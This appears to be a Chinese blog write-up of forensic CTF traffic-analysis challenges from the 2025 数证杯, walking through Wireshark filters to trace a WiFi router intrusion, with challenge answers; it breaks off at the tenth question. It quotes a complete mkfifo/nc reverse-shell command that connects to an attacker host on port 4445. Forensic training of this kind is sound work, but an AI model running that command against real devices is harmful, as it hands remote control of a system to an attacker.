---
title: DIDCTF-2025数证杯-初赛&决赛个人赛-流量分析
url: https://mp.weixin.qq.com/s/k0R_Vwxfghlo34334TTf0w
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:35:29.691757
---

# DIDCTF-2025数证杯-初赛&决赛个人赛-流量分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibOAYLFxOLMBJfv1weBBiaIhnmga7vVUMb2rgPricTSibxrl1HJnqxH3pRw/0?wx_fmt=jpeg)

# DIDCTF-2025数证杯-初赛&决赛个人赛-流量分析

原创

北渚
北渚

南有禾木

![]()

在小说阅读器中沉浸阅读

# 前言

记录DIDCTF中的2025数证杯初赛和决赛个人赛的流量分析题目，不是专业取证，只做了流量分析。

因为题目不多，懒得写成两篇了，所以把初赛和决赛的题目放到一起了。

WiFi的流量分析之前也做的不多，这回也学到了干货。

题目与检材都来自DIDCTF平台：`https://forensics.didctf.com/`

# 一、DIDCTF-2025数证杯-初赛-流量包分析

## 检材下载

下载链接：`https://pan.baidu.com/share/init?surl=IUj600YuLJeYvfIoY_yryQ&pwd=smh3`

哈希值：`MD5值：be07444b014fdb86393f83139aa20c15`

挂载/解压密码：`GQ7aXryvOC*M8qG*eXa19K9*g&jtHS*Gtrimps@Qx*aYt4oRwwK*HeN0A$#EPv*u`

## 1、黑客攻击的目标路由器 SSID 为（答案格式：请按实际值填写）

过滤语法：`(wlan.fc.type_subtype == 0x0b) ||(wlan.fc.type_subtype == 0x00) ||(wlan.fc.type_subtype == 0x01)`

讲解：

```
802.11 客户端（STA）想连接某个路由器（AP）时，完整的管理帧流程大致是：
1. 认证阶段（Authentication）：客户端首先向AP发送Authentication Request帧，请求进行身份认证。AP收到请求后，会返回Authentication Response 帧，告知是否允许认证。对于开放系统（Open System），认证通常会直接通过。
2. 关联阶段（Association）：认证通过后，客户端发送Association Request帧，请求加入AP所在的网络（SSID）。AP收到请求后，会返回Association Response帧，表示是否允许客户端加入网络。
3. 数据传输阶段：当认证和关联都成功完成后，客户端正式加入AP，接下来可以进行数据帧的传输。

这就是 Wireshark 里的三类管理帧对应的顺序：
wlan.fc.type_subtype == 0x0b → Authentication
wlan.fc.type_subtype == 0x00 → Association Request
wlan.fc.type_subtype == 0x01 → Association Response
```

所以黑客攻击的路由器，肯定是完整的连接了路由器，所以必然包括这三个步骤，所以使用这个过滤语法，过滤出所有 Authentication、Association Request 和 Association Response 帧：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibrYXekAicNfKu3ptMGbfwWgw2Wt01ria18qTXtkY7yUj4wqtyxIVOib6gQ/640?wx_fmt=png&from=appmsg)

然后看到SSID仅出现了`laozhaoWIFI`

## 2、黑客成功捕获了 WIFI 中 WPA 协议握手包，其中有效握手包组数为 (完整握手为一组)（答案格式：1）

```
EAPOL ：Extensible Authentication Protocol over LAN（局域网可扩展认证协议）是 802.1X / WPA / WPA2 协议认证的核心帧类型，用于客户（STA）和AP之间交换身份认证信息，在WPA/WPA2中，4次握手（4‑Way Handshake）就是用EAPOL帧传的密钥信息，EAPOL 本身是 数据链路层的控制帧，不携带用户数据，只用于认证和密钥协商

WPA 4 次握手中 EAPOL 的作用
握手消息 EAPOL 内容
Message 1 AP 发送 ANonce（随机数）给 STA
Message 2 STA 回复 SNonce + MIC（客户端随机数 + 校验）
Message 3 AP 发送 GTK + MIC 给 STA
Message 4 STA 确认安装 GTK

所有四条都是 EAPOL Key 帧
```

所以用`eapol`过滤，总共`4`个完整的握手包：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibwvRYFhDhfMZxIXtiaj0nSBlq1nwSVmPe7e5zxaDlvBePpXibNnOzjG4A/640?wx_fmt=png&from=appmsg)

## 3、黑客爆破得出的 WiFi 密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）

WPA 握手包里不能直接看到 WiFi 明文密码，仅包含经哈希运算的加密密钥相关信息（如 PMK、PTK 的衍生校验值 MIC 等），需通过暴力破解或字典攻击才能还原密码。所以这个题从连接WiFi的认证这里是没法做的，但是在流量包中也看到了很多HTTP的包，习惯性的看了一下，发现访问的都是路由器的管理页，所以猜测管理页中可能会有密码（登录过路由器管理页的应该都有印象，WiFi密码在管理页中）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibYuGxgHyRQIMpAVHLVWeGLU7jeibPu8tSTQibVgmVOywia0qQwAbNib1QsQ/640?wx_fmt=png&from=appmsg)

追踪50209号包的HTTP流看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcib1oJJCerX1znBazuIj3WUMvDvTQoEUYOIibqOIdlnSYRQS8XWCD5MqaA/640?wx_fmt=png&from=appmsg)

这里明显是在爆破管理页面的密码。

继续往下翻，翻到了`key`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibzvm1SZtde59vmOFENic00bQCFribFVAtu48fAMO3UqVtxEP2Y7vQkOtw/640?wx_fmt=png&from=appmsg)

密码：`password1110`

## 4、黑客成功连接 Wifi 后，发现路由器操作系统为？（答案格式：请按实际值填写）

还是`tcp.stream eq 184`的流，刚才那个发现密码的响应包：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibicmHxlYvdgWy1WIHLrQB5HJF7AYqcQ0ndNicdqfnJAnRjqAnDlLHlzvg/640?wx_fmt=png&from=appmsg)

这里面太乱了，不好分析，把它复制出来整理一下格式：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcib8Q5HQLHpypTQXQBwYmx0LwMZQe2QXtH7fNEEywh4LrwwYI5T5uC7mw/640?wx_fmt=png&from=appmsg)

直接看到hostname：`ImmortalWrt`

## 5、黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）

还是`tcp.stream eq 184`，追踪这个流就看到在在进行登录尝试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibOUcHicaVMWK3tojfLnck6mB6Jgo0icIbmgarYRYH6NxqrhibiaIDJMkgVA/640?wx_fmt=png&from=appmsg)

页面回复了403，说明密码不对，就从这里往下翻，终于翻到了302 Found：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibjwDcNJSBy2uQNA7AXbIK77vNKiaz2Yne9GJzs8uCNWFR2ic9Kx2heOGQ/640?wx_fmt=png&from=appmsg)

并且接下来就就是200 OK，并且是管理页的标题，说明这个就是登录成功的响应包，往上翻，查看它的请求包即可：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibFNxcR6Dljj81H2hIEykoDQ4qFstx1f8vXuF6mYY8DibreKqpwOk6MLw/640?wx_fmt=png&from=appmsg)

密码：`password`

## 6、黑客通过修改路由器设置，将被劫持的域名为（答案格式：www.xxx.com）

既然是在路由器管理页面中修改的路由器设置，肯定是HTTP协议，然后和域名相关的，就是包含domain的，所以过滤的语法：`http contains "domain"`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibjFibGibntuc262T3mKmRcddPrALibSjRo7S7t2omh31YmRJic5pF12AJbQ/640?wx_fmt=png&from=appmsg)

然后一个个追踪流，搜索domain，在67764号包追踪HTTP流时，看到了domain：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibPPXukAZfiaAoONjPiaP1D4KAOlGoWwaf7WibPHcf1ianjmEnCYTM6sibmKQ/640?wx_fmt=png&from=appmsg)

75329号包：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibQkia7upj55t6q2FmY5KAib7GyvhDWJj1Nc66zZR4RoicIEc46O8vlQCvQ/640?wx_fmt=png&from=appmsg)

众所周知QQ的IP不可能是个192.168的，所以肯定是劫持的域名：`www.qq.com`

## 7、黑客在路由器管理后台发现 FTP 服务配置，FTP 登录密码为？（答案格式：请按实际值填写）

那就直接过滤`ftp`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibXPj39E3UricQbeRdMcygibrW7ib6A7oYoXHm8haCPjsibrX4e1jZpMThlA/640?wx_fmt=png&from=appmsg)

并且上来就看到了`173791`号包是`Login successful`，直接这个包上追踪TCP流：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcib8iakjx95NsbibPKawfvxia9onibNDZXUCqWGfgfiaQw4WjzCcGq7qHqMSsw/640?wx_fmt=png&from=appmsg)

密码是：`mast`

## 8、黑客通过 FTP 上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）

还是`tcp.stream eq 557` 这个流，往下翻：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibYkn3kgDER69cLmEXpChuh3vqgRRqHg72PbPxNq1w4bABzfHryW61AA/640?wx_fmt=png&from=appmsg)

看到了`STOR /home/ftp/flag.zip`（STOR是FTP 协议的内置上传命令，等价于PUT）

然后重新用语法过滤：`ftp||ftp-data`（FTP传输文件的协议在wireshark里表现为ftp-data，不带上这个语法看不到传输的文件）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibh6hByOHibGiaQCa19wUfVCEF7mIIsvAuWZOEaq02m1jR3j9RsyFUUxWg/640?wx_fmt=png&from=appmsg)

在这个包上追踪流，导出来：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcib99mJRwPnK5Gmwqo2F4xiaBcTD5bOSxhtMWqzTPOR7X8nrjnQcDSpdpA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcib9Q4JYRdaxky2xOmlgqeesFbFYiagk9hlLK1GqBxHzI8EHdOficM99JsA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibjRdv2iaTXBHicVicuBxJFt5dAmz30nsGurwhmnzcpguvkicysEsQ0GkZ9w/640?wx_fmt=png&from=appmsg)

然后解压竟然还要密码，我去……

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibYeFsr33CczHxOpCQJibViaT4SdeTvEbzkM0zewNXHks9RaPqhb1k27Sg/640?wx_fmt=png&from=appmsg)

流量包中没有看到解压密码，直接爆破，仅需3秒：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcib3ObtnLhy1D6vOLOAQQjeEcIwZ42KD6LYCaqHa33zK9kdibopeSfeT3A/640?wx_fmt=png&from=appmsg)

密码是`4321`，解压后得到flag.txt，其中的内容是：`code:123456789`

## 9、黑客通过路由器执行 shell 脚本，反弹 shell 的监听端口为（答案格式：1）

这个在HTTP的包中看到的，反弹shell脚本肯定是在管理页中执行的，所以过滤出HTTP的包，从登录成功的地方开始往下找，最后在`tcp.stream eq 201`这个流中找到了执行命令的语句：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibJKNZ6SBZPibVRPYfST1FJz2SUxfVgEJJTBI7jjB3v0mUicgBRBkMibv2A/640?wx_fmt=png&from=appmsg)

虽然没看到反弹shell的内容，但是知道了执行命令的关键字：`command`，所以直接过滤这个关键字：`http contains "command"`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibic10TqXkBw0CCVah1ywiau5aRqZLbQUI0SSwJE24gFomyDRzQ7djxkYg/640?wx_fmt=png&from=appmsg)

终于在`tcp.stream eq 887`这个流中找到了反弹shell的语句：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibdgJwtzDU1McQ7StC7XB8rXxtN07jnJC1bNQ0m8N0CKqnQS4YHaNlIA/640?wx_fmt=png&from=appmsg)

所以监听的端口为：`4445`

## 10、黑客通过反弹 shell 成功控制目标路由器后，总共执行了多少条命令（答案格式：1）

前边已经找到了反弹shell用的命令：

```
/bin/sh -c \"mkfifo /tmp/f 2>/dev/null; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.244 4445 > /tmp/f; rm /tmp/f 2>/dev/null
```

从这个命令知道了攻击主机是`192.168.1.244`，关键是端口为`4445`，所以直接过滤：`tcp.port eq 4445`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HtG3DtQMd7NALZ9bKzmwpj9LlFVVQfcibUxlGflCr4RS3zHc4jJjiaXW7Cup9Xwuk6lQlGX6wibCwbQbCXxy07wYw/640?wx_fmt=png&from=appmsg)

这些就是反弹shell执行...